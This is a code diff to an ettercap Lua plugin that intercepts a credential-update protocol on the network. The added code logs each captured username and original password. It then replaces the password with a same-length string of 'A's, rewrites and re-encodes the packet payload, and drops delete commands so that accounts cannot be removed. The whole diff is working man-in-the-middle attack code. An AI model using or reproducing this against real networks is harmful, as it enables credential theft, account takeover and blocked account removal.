@@ -31,23 +31,42 @@ action = function(packet_object)
    local cmd = record[1]
    local username = record[2]
 
-   -- if Add
-   if cmd == "A" then
+   -- On Add or Modify...
+   if cmd == "A" or cmd == "M" then
       local passwd = record[3]
-      ettercap.log("NEW_CRED %s:%s\n", username, passwd)
 
-   -- if Modify
-   elseif cmd == "M" then
-      local passwd = record[3]
-      ettercap.log("MOD_CRED %s:%s\n", username, passwd)
+      ettercap.log("%s ORIG_CRED %s:%s\n", cmd, username, passwd)
+
+      -- Generate a new passwd of the same length, but all A's 
+      --   ex: 'XYZ' -> 'AAA'
+      local new_passwd = string.rep('A', passwd:len())
+
+      ettercap.log("%s EVIL_CRED %s:%s\n", cmd, username, new_passwd)
+
+      -- Set the new passwd
+      record[3] = new_passwd
+
+      -- Build the new record
+      local new_record = table.concat(record, ':')
+      local encoded_record = to_base64(new_record)
+
+      -- Replace the payload of the packet.
+      packet_object:set_data(encoded_record)
+
+      -- We're done!
+      return
 
    -- if Delete
    elseif cmd == "D" then
-      ettercap.log("DEL_CRED %s\n", username)
+      -- D:username
+      ettercap.log("Dropping delete of %s\n", username)
+      packet_object:set_dropped()
+      return
 
    else
       ettercap.log("Unknown command %s\n", rawcmd)
    end
 end
+
 
 
